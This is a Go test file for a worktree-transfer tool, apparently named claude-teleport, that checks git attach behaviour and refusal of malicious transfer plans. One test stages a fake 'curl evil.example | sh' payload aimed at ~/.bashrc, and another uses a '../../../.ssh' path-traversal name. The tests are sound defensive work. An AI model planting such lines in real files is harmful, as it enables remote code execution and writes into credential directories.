package remote

import (
	"bytes"
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mithro/go-claude-teleport/internal/gitx"
	"github.com/mithro/go-claude-teleport/internal/job"
	"github.com/mithro/go-claude-teleport/internal/transfer"
)

func gitc(t *testing.T, dir string, args ...string) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=alice", "GIT_AUTHOR_EMAIL=a@laptop.example", "GIT_COMMITTER_NAME=alice", "GIT_COMMITTER_EMAIL=a@laptop.example", "GIT_CONFIG_GLOBAL=/dev/null")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func TestLocalInventoryGitAndDestState(t *testing.T) {
	p := testPaths(t)
	repo := filepath.Join(p.Home, "x")
	os.MkdirAll(repo, 0o755)
	gitc(t, repo, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(repo, "a.txt"), []byte("a"), 0o644)
	gitc(t, repo, "add", "a.txt")
	gitc(t, repo, "commit", "-q", "-m", "init")
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	info, err := l.InventoryGit(context.Background(), repo)
	if err != nil {
		t.Fatal(err)
	}
	if info.Branch != "main" || info.MainDir != repo {
		t.Errorf("info = %+v", info)
	}
	if _, err := l.InventoryGit(context.Background(), t.TempDir()); err == nil {
		t.Error("non-repo must return an error")
	} else if e, ok := err.(*Error); !ok || e.Code != "not-found" {
		t.Errorf("non-repo error = %v, want *Error{Code: not-found}", err)
	}
	ds, err := l.GitDestState(context.Background(), repo, repo, "main")
	if err != nil {
		t.Fatal(err)
	}
	if !ds.MainExists || !ds.Clean {
		t.Errorf("dest state = %+v", ds)
	}
}

func TestLocalGitAttachUsesStagingPaths(t *testing.T) {
	p := testPaths(t)
	main := filepath.Join(p.Home, "x")
	os.MkdirAll(main, 0o755)
	gitc(t, main, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
	gitc(t, main, "add", "a.txt")
	gitc(t, main, "commit", "-q", "-m", "init")
	tip := strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	staging := job.StagingDir(p.DataDir, jobID)
	os.MkdirAll(staging, 0o700)
	os.WriteFile(filepath.Join(staging, "7"), []byte("untracked\n"), 0o644)
	idx, _ := os.ReadFile(filepath.Join(main, ".git", "index"))
	os.WriteFile(filepath.Join(staging, "8"), idx, 0o644)

	w := filepath.Join(main, ".worktrees", "feat")
	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "feat", Branch: "feat", Tip: tip, NeedPack: false,
		IndexRel: ".git/worktrees/feat/index", IndexEntryID: 8, PackEntryID: gitx.NoEntry,
		DirtyEntries: map[string]int{filepath.Join(w, "new.txt"): 7}}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	if err := l.GitAttach(context.Background(), plan, jobID); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(filepath.Join(w, "new.txt")); err != nil || string(b) != "untracked\n" {
		t.Errorf("dirty file not applied: %v %q", err, b)
	}
	if got := strings.TrimSpace(gitc(t, w, "rev-parse", "--abbrev-ref", "HEAD")); got != "feat" {
		t.Errorf("worktree branch = %q", got)
	}
	if !strings.Contains(gitc(t, main, "worktree", "list"), w) {
		t.Error("git does not list the new worktree")
	}
}

// TestLocalGitAttachAppliesManifestEntryMode is task 20 point C: a dirty
// worktree file lands with the mode its manifest entry recorded, not
// whatever mode the staged copy on disk happens to carry.
func TestLocalGitAttachAppliesManifestEntryMode(t *testing.T) {
	p := testPaths(t)
	main := filepath.Join(p.Home, "x")
	os.MkdirAll(main, 0o755)
	gitc(t, main, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
	gitc(t, main, "add", "a.txt")
	gitc(t, main, "commit", "-q", "-m", "init")
	tip := strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	staging := job.StagingDir(p.DataDir, jobID)
	os.MkdirAll(staging, 0o700)
	content := []byte("#!/bin/sh\necho hi\n")
	os.WriteFile(filepath.Join(staging, "7"), content, 0o644) // staged with 0644...

	w := filepath.Join(main, ".worktrees", "feat")
	m := &transfer.Manifest{Version: 1, JobID: jobID, Entries: []transfer.Entry{
		{ID: 7, Dst: filepath.Join(w, "run.sh"), Size: int64(len(content)), Mode: 0o755}, // ...but the manifest says 0755 (executable)
	}}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	if err := m.Save(filepath.Join(l.jobDir(jobID), "manifest.json")); err != nil {
		t.Fatal(err)
	}

	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "feat", Branch: "feat", Tip: tip, NeedPack: false,
		IndexRel: ".git/worktrees/feat/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry,
		DirtyEntries: map[string]int{filepath.Join(w, "run.sh"): 7}}
	if err := l.GitAttach(context.Background(), plan, jobID); err != nil {
		t.Fatal(err)
	}
	st, err := os.Stat(filepath.Join(w, "run.sh"))
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm() != 0o755 {
		t.Errorf("run.sh mode = %o, want 0755 (from the manifest entry, not the staged copy's 0644)", st.Mode().Perm())
	}
}

// TestLocalGitAttachErrorsOnCorruptManifest is R-P3-20d: entryModes must
// not treat every transfer.Load failure the same as "no manifest was ever
// saved" — only os.ErrNotExist means "absent, fall back to mode 0".
// Anything else (here, corrupt JSON) must error out of GitAttach rather
// than silently installing the dirty file with the staged copy's own mode.
func TestLocalGitAttachErrorsOnCorruptManifest(t *testing.T) {
	p := testPaths(t)
	main := filepath.Join(p.Home, "x")
	os.MkdirAll(main, 0o755)
	gitc(t, main, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
	gitc(t, main, "add", "a.txt")
	gitc(t, main, "commit", "-q", "-m", "init")
	tip := strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	staging := job.StagingDir(p.DataDir, jobID)
	os.MkdirAll(staging, 0o700)
	os.WriteFile(filepath.Join(staging, "7"), []byte("untracked\n"), 0o644)

	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	if err := os.MkdirAll(l.jobDir(jobID), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(l.jobDir(jobID), "manifest.json"), []byte("{not valid json"), 0o600); err != nil {
		t.Fatal(err)
	}

	w := filepath.Join(main, ".worktrees", "feat")
	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "feat", Branch: "feat", Tip: tip, NeedPack: false,
		IndexRel: ".git/worktrees/feat/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry,
		DirtyEntries: map[string]int{filepath.Join(w, "new.txt"): 7}}
	err := l.GitAttach(context.Background(), plan, jobID)
	if err == nil {
		t.Fatal("GitAttach with a corrupt manifest.json must error, not silently fall back to mode 0")
	}
	if _, statErr := os.Stat(filepath.Join(w, "new.txt")); statErr == nil {
		t.Error("dirty file must not be installed when its mode could not be determined because the manifest is corrupt")
	}
}

// TestLocalGitAttachRestoresIndexAtManifestEntryZero is the I4 regression:
// manifest ids are 0-based (transfer.Build assigns them by slice index), so
// the index file can legitimately be entry 0. With the old `!= 0` sentinel
// that entry was silently skipped and gitx.Attach attached a worktree
// carrying whatever index git happened to create, with no error anywhere.
func TestLocalGitAttachRestoresIndexAtManifestEntryZero(t *testing.T) {
	p := testPaths(t)
	main := filepath.Join(p.Home, "x")
	os.MkdirAll(main, 0o755)
	gitc(t, main, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
	gitc(t, main, "add", "a.txt")
	gitc(t, main, "commit", "-q", "-m", "init")
	tip := strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
	// A staged-but-uncommitted file makes this index distinguishable from
	// the one git writes when it creates the linked worktree.
	os.WriteFile(filepath.Join(main, "staged.txt"), []byte("s"), 0o644)
	gitc(t, main, "add", "staged.txt")
	wantIndex, err := os.ReadFile(filepath.Join(main, ".git", "index"))
	if err != nil {
		t.Fatal(err)
	}

	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	staging := job.StagingDir(p.DataDir, jobID)
	os.MkdirAll(staging, 0o700)
	os.WriteFile(filepath.Join(staging, "0"), wantIndex, 0o644) // entry 0: the index

	w := filepath.Join(main, ".worktrees", "feat")
	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "feat", Branch: "feat", Tip: tip, NeedPack: false,
		IndexRel: ".git/worktrees/feat/index", IndexEntryID: 0, PackEntryID: gitx.NoEntry}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	if err := l.GitAttach(context.Background(), plan, jobID); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(filepath.Join(main, ".git", "worktrees", "feat", "index"))
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, wantIndex) {
		t.Errorf("worktree index (%d bytes) is not the transferred one (%d bytes): manifest entry 0 was skipped", len(got), len(wantIndex))
	}
	if !strings.Contains(gitc(t, w, "status", "--porcelain"), "staged.txt") {
		t.Errorf("git in %s does not see the staged file the restored index records", w)
	}
}

// --- Ruling R-P3-B1f N1: git-attach is the destination's SECOND write
// path, and until now it took the wire Plan's DstMain/DstWorktree/
// WorktreeName at face value. gitx's own checkDirtyContainment is relative
// to DstWorktree, so a source that names $HOME as the worktree contains
// nothing at all; repairLinkedMetadata has no preconditions; and
// WorktreeName is joined straight into a path. The destination now
// validates the plan's own paths — with the same resolved-root rules
// transfer.Install uses — before gitx.Attach ever runs. ---

// gitAttachRepo builds a real destination repository under home and
// returns its path and tip.
func gitAttachRepo(t *testing.T, home string) (string, string) {
	t.Helper()
	main := filepath.Join(home, "x")
	os.MkdirAll(main, 0o755)
	gitc(t, main, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
	gitc(t, main, "add", "a.txt")
	gitc(t, main, "commit", "-q", "-m", "init")
	return main, strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
}

// TestGitAttachRefusesWorktreeOutsideARepo is the reviewer's PoC: an
// existing-main plan naming $HOME as the destination worktree, with a
// "dirty file" that is really the user's ~/.bashrc. gitx's containment
// check is satisfied (the file IS under the claimed worktree), so the
// destination must refuse the plan itself.
func TestGitAttachRefusesWorktreeOutsideARepo(t *testing.T) {
	p := testPaths(t)
	main, tip := gitAttachRepo(t, p.Home)
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	staging := job.StagingDir(p.DataDir, jobID)
	os.MkdirAll(staging, 0o700)
	os.WriteFile(filepath.Join(staging, "7"), []byte("curl evil.example | sh\n"), 0o644)
	bashrc := filepath.Join(p.Home, ".bashrc")
	rc := "# the user's own shell rc\n"
	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
		t.Fatal(err)
	}

	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x",
		DstMain: main, DstWorktree: p.Home, Linked: false, Branch: "main", Tip: tip,
		IndexRel: ".git/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry,
		DirtyEntries: map[string]int{bashrc: 7}}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	err := l.GitAttach(context.Background(), plan, jobID)
	if err == nil {
		t.Fatal("git-attach must refuse a plan whose destination worktree is $HOME")
	}
	var re *Error
	if !errors.As(err, &re) || re.Code != "refused" {
		t.Errorf("err = %v (%T), want a remote.Error with code refused", err, err)
	}
	if got, _ := os.ReadFile(bashrc); string(got) != rc {
		t.Errorf("%s was overwritten: %q", bashrc, got)
	}
}

// TestGitAttachRefusesFreshMainRootThisJobNeverCreated: fresh-main's only
// work is repairLinkedMetadata, which writes <DstWorktree>/.git and
// <DstMain>/.git/worktrees/<name>/gitdir with no preconditions at all. In
// fresh-main both destination roots are, by construction, directories THIS
// job's install created — so both must be recorded in the job's own
// roots.json.
func TestGitAttachRefusesFreshMainRootThisJobNeverCreated(t *testing.T) {
	p := testPaths(t)
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	victim := filepath.Join(p.Home, "victim")
	if err := os.MkdirAll(victim, 0o755); err != nil {
		t.Fatal(err)
	}
	main := filepath.Join(p.Home, "x")
	if err := os.MkdirAll(main, 0o755); err != nil {
		t.Fatal(err)
	}
	plan := &gitx.Plan{Mode: gitx.ModeFreshMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: victim, Linked: true, WorktreeName: "feat", Branch: "feat",
		IndexRel: ".git/worktrees/feat/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	err := l.GitAttach(context.Background(), plan, jobID)
	if err == nil {
		t.Fatal("git-attach must refuse a fresh-main plan whose roots this job never created")
	}
	if _, err := os.Lstat(filepath.Join(victim, ".git")); !os.IsNotExist(err) {
		t.Errorf("%s/.git was written (err %v)", victim, err)
	}
}

// TestGitAttachRefusesWorktreeNameTraversal: WorktreeName is joined into
// <DstMain>/.git/worktrees/<name>, so "../../../.ssh" made
// repairLinkedMetadata write a "gitdir" file into ~/.ssh.
func TestGitAttachRefusesWorktreeNameTraversal(t *testing.T) {
	p := testPaths(t)
	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
	main, _ := gitAttachRepo(t, p.Home)
	w := filepath.Join(main, ".worktrees", "feat")
	if err := os.MkdirAll(w, 0o755); err != nil {
		t.Fatal(err)
	}
	plan := &gitx.Plan{Mode: gitx.ModeFreshMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "../../../.ssh", Branch: "feat",
		IndexRel: ".git/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry}
	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
	if err := l.GitAttach(context.Background(), plan, jobID); err == nil {
		t.Fatal("git-attach must refuse a WorktreeName that is not a single safe path component")
	}
	if _, err := os.Lstat(filepath.Join(p.Home, ".ssh", "gitdir")); !os.IsNotExist(err) {
		t.Errorf("~/.ssh/gitdir was written (err %v)", err)
	}
}
